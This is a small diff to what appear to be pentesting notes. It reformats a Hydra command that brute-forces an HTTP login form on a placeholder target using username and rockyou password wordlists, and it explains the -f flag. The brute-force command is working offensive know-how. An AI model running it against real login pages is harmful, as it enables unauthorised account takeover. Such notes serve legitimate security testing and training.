@@ -23,12 +23,10 @@ Tools used :
 - Hydra: use Hydra to bruteforece the login page of website(HTTP)
 
 
-	>>$ hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt
-
-	  -f -v
+	>>$ hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v
 
 
-	-f tells Hyrdra to stop after it founs the user and the pass
+-f tells Hyrdra to stop after it founs the user and the pass
 
 
 
